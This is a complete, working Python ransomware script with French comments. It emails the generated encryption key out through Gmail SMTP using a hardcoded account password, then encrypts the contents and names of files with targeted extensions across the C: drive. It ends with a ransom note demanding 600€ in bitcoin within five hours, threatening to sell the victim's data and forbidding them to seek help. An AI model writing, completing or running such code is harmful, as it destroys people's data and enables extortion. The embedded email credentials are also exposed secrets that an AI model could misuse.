#!/usr/bin/python3  # Spécifie l'interpréteur Python à utiliser
from socket import gethostname  # Importer la fonction gethostname pour obtenir le nom d'hôte
from os import walk, path, rename  # Importer les fonctions walk, path, rename
from cryptography.fernet import Fernet  # Importer la classe Fernet du module cryptography.fernet
import smtplib  # Importer le module smtplib pour envoyer des emails
from email.mime.text import MIMEText  # Importer MIMEText pour créer le contenu de l'email
from email.mime.multipart import MIMEMultipart  # Importer MIMEMultipart pour créer un email multipart

# Fonction pour envoyer la clé par email
def envoyer_cle_email(cle: str, destinataire: str):
    expediteur = "klogger810@gmail.com"  # Adresse email de l'expéditeur
    mot_de_passe = "ldmj xpqq bahe lhvn"  # Mot de passe de l'email
    sujet = "Clé de déchiffrement"  # Sujet de l'email
    nom_hote = gethostname()  # Obtient le nom d'hôte de la machine
    corps = f"Voici la clé de déchiffrement : {cle}\nPour l'ordinateur avec ID : {nom_hote}"  # Corps de l'email

    message = MIMEMultipart()  # Création de l'objet MIMEMultipart
    message['From'] = expediteur  # Définir l'expéditeur
    message['To'] = destinataire  # Définir le destinataire
    message['Subject'] = sujet  # Définir le sujet
    message.attach(MIMEText(corps, 'plain'))  # Attacher le corps de l'email en texte brut

    try:
        serveur = smtplib.SMTP('smtp.gmail.com', 587)  # Connexion au serveur SMTP de Gmail
        serveur.starttls()  # Démarrer le chiffrement TLS
        serveur.login(expediteur, mot_de_passe)  # Connexion au compte email
        texte = message.as_string()  # Conversion de l'objet message en chaîne de caractères
        serveur.sendmail(expediteur, destinataire, texte)  # Envoi de l'email
        serveur.quit()  # Fermeture de la connexion au serveur SMTP
        print("Email envoyé avec succès.")  # Message de confirmation d'envoi
    except Exception as e:
        print(f"Échec de l'envoi de l'email : {e}")  # Message d'erreur en cas d'échec

# Fonction pour chiffrer les fichiers
def chiffrer_fichiers(cle: bytes):
    fer = Fernet(cle)  # Créer un objet Fernet avec la clé fournie
    for racine, dossiers, fichiers in walk("C:\\"):  # Parcourir tous les fichiers du disque C:
        for fichier in fichiers:
            chemin_fichier = path.join(racine, fichier)  # Obtenir le chemin complet du fichier
            extension = path.splitext(chemin_fichier)[1]  # Obtenir l'extension du fichier
            if extension in extensions:  # Vérifier si l'extension du fichier est ciblée
                try:
                    with open(chemin_fichier, "rb") as fichier_original:  # Ouvrir le fichier en lecture binaire
                        original = fichier_original.read()  # Lire le contenu du fichier
                    chiffre = fer.encrypt(original)  # Chiffrer le contenu du fichier
                    with open(chemin_fichier, "wb") as fichier_chiffre:  # Ouvrir le fichier en écriture binaire
                        fichier_chiffre.write(chiffre)  # Écrire le contenu chiffré dans le fichier
                    nom_chiffre = fer.encrypt(fichier.encode())  # Chiffrer le nom du fichier
                    nouveau_chemin = path.join(racine, nom_chiffre.decode())  # Créer le nouveau chemin avec le nom chiffré
                    rename(chemin_fichier, nouveau_chemin)  # Renommer le fichier avec le nom chiffré
                except:
                    pass  # Ignorer les erreurs

# Fonction pour déchiffrer les fichiers
def dechiffrer_fichiers(cle: bytes):
    fer = Fernet(cle)  # Créer un objet Fernet avec la clé fournie
    for racine, dossiers, fichiers in walk("C:\\"):  # Parcourir tous les fichiers du disque C:
        for fichier in fichiers:
            chemin_fichier = path.join(racine, fichier)  # Obtenir le chemin complet du fichier
            extension = path.splitext(chemin_fichier)[1]  # Obtenir l'extension du fichier
            if extension in extensions:  # Vérifier si l'extension du fichier est ciblée
                try:
                    with open(chemin_fichier, "rb") as fichier_chiffre:  # Ouvrir le fichier en lecture binaire
                        chiffre = fichier_chiffre.read()  # Lire le contenu chiffré du fichier
                    dechiffre = fer.decrypt(chiffre)  # Déchiffrer le contenu du fichier
                    with open(chemin_fichier, "wb") as fichier_dechiffre:  # Ouvrir le fichier en écriture binaire
                        fichier_dechiffre.write(dechiffre)  # Écrire le contenu déchiffré dans le fichier
                    nom_dechiffre = fer.decrypt(fichier.encode())  # Déchiffrer le nom du fichier
                    nouveau_chemin = path.join(racine, nom_dechiffre.decode())  # Créer le nouveau chemin avec le nom déchiffré
                    rename(chemin_fichier, nouveau_chemin)  # Renommer le fichier avec le nom déchiffré
                except:
                    print("La clé insérée est incorrecte.")  # Afficher un message d'erreur
                    return

# Fonction pour obtenir les extensions de fichiers
def obtenir_extensions() -> list:
    return [
        # Liste des extensions de fichiers à cibler
        ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".csv", ".d3dbsp", ".sc2save", ".sie", ".sum", ".ibank", ".t13", ".t12", ".qdf", ".gdb",
        ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", ".hkdb", ".tax",
        ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", ".itm", ".sb", ".fos", ".mcgame", ".vdf", ".ztmp", ".sis", ".sid", ".ncf",
        ".menu", ".layout", ".dmp", ".blob", ".esm", ".001", ".vtf", ".dazip", ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x",
        ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0",
        ".DayZProfile", ".rofl", ".hkx", ".bar", ".upk", ".das", ".iwi", ".litemod", ".asset", ".forge", ".ltx", ".bsa", ".apk", ".re4", ".sav",
        ".lbf", ".slm", ".bik", ".epk", ".rgss3a", ".pak", ".big", ".unity3d", ".wotreplay", ".xxx", ".desc", ".py", ".m3u", ".flv", ".js", ".css",
        ".rb", ".png", ".jpeg", ".txt", ".p7c",".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".x3f", ".srw", ".pef", ".ptx", ".r3d",
        ".rw2", ".rwl", ".raw", ".raf", ".orf", ".nrw", ".mrwref", ".mef", ".erf", ".kdc", ".dcr", ".cr2", ".crw", ".bay", ".sr2", ".srf", ".arw",
        ".3fr", ".dng", ".jpe", ".jpg", ".cdr", ".indd", ".ai", ".eps", ".pdf", ".pdd",".psd", ".dbfv", ".mdf", ".wb2", ".rtf", ".wpd", ".dxg",
        ".xf", ".dwg", ".pst", ".accdb", ".mdb", ".pptm", ".pptx", ".ppt", ".xlk", ".xlsb", ".xlsm",".xlsx", ".xls", ".wps", ".docm", ".docx",
        ".doc", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt"
    ]

extensions=obtenir_extensions()


# Fonction principale
def principal():
    cle = Fernet.generate_key()  # Générer une clé de chiffrement
    fer = Fernet(cle)  # Créer un objet Fernet avec la clé générée
    nom_hote = gethostname()  # Obtenir le nom d'hôte de la machine

    # Envoyer la clé par email
    envoyer_cle_email(cle.decode(), "loggerkey285@gmail.com")  # Envoyer la clé de chiffrement par email

    # Chiffrer les fichiers
    chiffrer_fichiers(cle)  # Chiffrer les fichiers avec la clé générée

    # Message d'avertissement et instructions de paiement
    print("Attention ! Votre disque dur a été chiffré.\n"
      "Vous avez 5 heures pour envoyer 600€ en bitcoins à l'adresse suivante : www.example.com.\n"
      "Si vous ne suivez pas cette instruction, toutes vos données importantes, ainsi que vos mots de passe, seront vendus.\n"
      "IMPORTANT :\n"
      "Vous aurez besoin de ces informations pour déchiffrer vos fichiers.\n"
      f"Voici votre identifiant : {nom_hote}. Conservez-le en sécurité car il sera nécessaire lors de la confirmation de votre paiement.\n"
      "Il n'existe qu'une seule manière de récupérer vos fichiers :\n"
      "Envoyez 600€ en bitcoins à l'adresse suivante : www.example.com.\n"
      "Après réception du paiement, nous vous fournirons les instructions pour récupérer vos fichiers. Ne tentez pas les actions suivantes :\n"
      "1) Tenter de déchiffrer les fichiers par vous-même.\n"
      "2) Chercher une aide extérieure.\n"
      "3) Envoyer une somme différente.\n"
      "4) Perdre, supprimer ou oublier votre identifiant.\n"
      "Nous espérons que vous suivrez ces instructions.")

    # Demander la clé de déchiffrement à l'utilisateur
    while True:
        cle_saisie = input("Veuillez entrer la clé de déchiffrement : ").encode()  # Demander la clé de déchiffrement
        try:
            fer = Fernet(cle_saisie)  # Créer un objet Fernet avec la clé saisie
            dechiffrer_fichiers(cle_saisie)  # Déchiffrer les fichiers avec la clé saisie
            print("Votre système a été déchiffré avec succès.")  # Message de succès
            break
        except Exception as e:
            print("Clé de déchiffrement incorrecte, veuillez réessayer.")  # Message d'erreur en cas d'échec

# Début du programme
if __name__ == "__main__":
    principal()  # Appeler la fonction principale


